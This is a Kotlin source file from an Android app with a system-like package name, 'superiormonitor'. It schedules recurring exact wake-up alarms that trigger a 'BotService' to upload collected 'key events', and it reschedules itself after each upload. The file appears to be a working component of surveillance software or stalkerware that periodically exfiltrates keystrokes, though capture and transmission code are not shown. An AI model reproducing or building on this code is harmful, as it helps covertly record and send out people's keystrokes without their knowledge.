package com.system.superiormonitor.monitor

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.SystemClock
import com.system.superiormonitor.bot.BotService
import com.system.superiormonitor.data.PrefsManager
import com.system.superiormonitor.util.LogCategory
import com.system.superiormonitor.util.LogLevel
import com.system.superiormonitor.util.LogManager

class KeyEventScheduler(private val context: Context) {
    private val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
    private val prefsManager = PrefsManager.getInstance(context)

    fun scheduleNextKeyEventUpload() {
        if (!prefsManager.keyEventsEnabled) return

        val intent = Intent(context, KeyEventReceiver::class.java).apply {
            action = "com.system.superiormonitor.ACTION_KEY_EVENTS_UPLOAD"
        }
        val pendingIntent = PendingIntent.getBroadcast(
            context, 3, intent, PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        val intervalMillis = prefsManager.keyEventsIntervalMin * 60 * 1000L
        val staggerMs = 2000L // Stagger by 2 seconds to not conflict with snapshot
        val triggerTime = SystemClock.elapsedRealtime() + intervalMillis + staggerMs

        try {
            alarmManager.setExactAndAllowWhileIdle(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                triggerTime,
                pendingIntent
            )
            LogManager.log(LogCategory.BASIC_UPDATE, "Scheduled next Key Events upload in ${prefsManager.keyEventsIntervalMin} minutes.")
        } catch (e: SecurityException) {
            LogManager.log(LogCategory.BASIC_UPDATE, "Exact alarm permission missing. Falling back to inexact alarm.", LogLevel.ERROR)
            alarmManager.setAndAllowWhileIdle(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                triggerTime,
                pendingIntent
            )
        }
    }

    fun cancelKeyEventUpload() {
        val intent = Intent(context, KeyEventReceiver::class.java).apply {
            action = "com.system.superiormonitor.ACTION_KEY_EVENTS_UPLOAD"
        }
        val pendingIntent = PendingIntent.getBroadcast(
            context, 3, intent, PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        alarmManager.cancel(pendingIntent)
        LogManager.log(LogCategory.BASIC_UPDATE, "Cancelled Key Events schedule.")
    }
}

class KeyEventReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val prefsManager = PrefsManager.getInstance(context)
        if (!prefsManager.keyEventsEnabled) return

        LogManager.log(LogCategory.BASIC_UPDATE, "[KeyEventScheduler] Interval reached. Triggering offline queue process...")
        
        // Send specific online action to BotService
        val botIntent = Intent(context, BotService::class.java).apply {
            action = "ACTION_UPLOAD_KEY_EVENTS"
        }
        context.startService(botIntent)

        // Reschedule
        KeyEventScheduler(context).scheduleNextKeyEventUpload()
    }
}
